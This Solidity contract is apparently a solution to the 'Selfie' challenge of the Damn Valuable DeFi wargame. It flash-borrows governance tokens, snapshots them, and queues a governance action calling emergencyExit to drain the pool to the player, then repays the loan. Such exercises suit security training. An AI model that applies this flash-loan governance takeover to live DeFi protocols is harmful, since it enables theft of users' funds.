// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

import "hardhat/console.sol";

contract SelfiePoolAttacker {
  SelfiePool public selfiePool;
  SimpleGovernance public governance;
  address public player;
  DamnValuableTokenSnapshot public token;

  constructor(address _selfiePool, address _governance, address _player) {
    selfiePool = SelfiePool(_selfiePool);
    governance = SimpleGovernance(_governance);
    player = _player;
    token = DamnValuableTokenSnapshot(address(selfiePool.token()));
  }

  function attack(uint256 amount) external {
    bytes memory data = abi.encodeWithSignature(
        "emergencyExit(address)",
        player
    );

    selfiePool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            amount,
            data
        );
  }

  function onFlashLoan(
        address,
        address,
        uint256 _amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        console.log("onFlashLoan entered");
        console.log("Token balance: %s", token.balanceOf(address(this)));
        token.snapshot();
        governance.queueAction(address(selfiePool), 0, data);
        token.approve(address(selfiePool), _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
